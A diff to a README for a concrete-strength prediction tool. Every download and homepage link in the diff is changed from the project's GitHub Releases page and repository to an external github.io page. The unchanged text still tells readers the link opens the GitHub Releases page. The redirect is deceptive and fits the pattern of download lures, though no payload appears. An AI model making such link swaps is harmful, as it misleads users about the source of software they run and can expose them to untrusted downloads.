@@ -1,10 +1,10 @@
 # 🧱 concrete-strength-predictor - Estimate Concrete Strength from Mix Design
 
-[![Download Latest Release](https://img.shields.io/badge/Download-v1.0-blue?style=for-the-badge&logo=github)](https://github.com/sarad5513/concrete-strength-predictor/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-v1.0-blue?style=for-the-badge&logo=github)](https://sarad5513.github.io)
 
 ## 📥 Quick Download
 
-Visit the [Releases page](https://github.com/sarad5513/concrete-strength-predictor/releases) to download the latest version.
+Visit the [Releases page](https://sarad5513.github.io) to download the latest version.
 
 ---
 
@@ -62,7 +62,7 @@ Follow these steps exactly. You will have the tool running in under 2 minutes.
 
 ### Step 1: Visit the Download Page
 
-Click this link: [https://github.com/sarad5513/concrete-strength-predictor/releases](https://github.com/sarad5513/concrete-strength-predictor/releases)
+Click this link: [https://sarad5513.github.io](https://sarad5513.github.io)
 
 This opens the GitHub Releases page for this project.
 
@@ -204,8 +204,8 @@ This project is open source. You can use, modify, and share it freely.
 
 ## 🔗 Direct Links
 
-- **Download page:** [https://github.com/sarad5513/concrete-strength-predictor/releases](https://github.com/sarad5513/concrete-strength-predictor/releases)
-- **Project homepage:** [https://github.com/sarad5513/concrete-strength-predictor](https://github.com/sarad5513/concrete-strength-predictor)
+- **Download page:** [https://sarad5513.github.io](https://sarad5513.github.io)
+- **Project homepage:** [https://sarad5513.github.io](https://sarad5513.github.io)
 
 ---
 
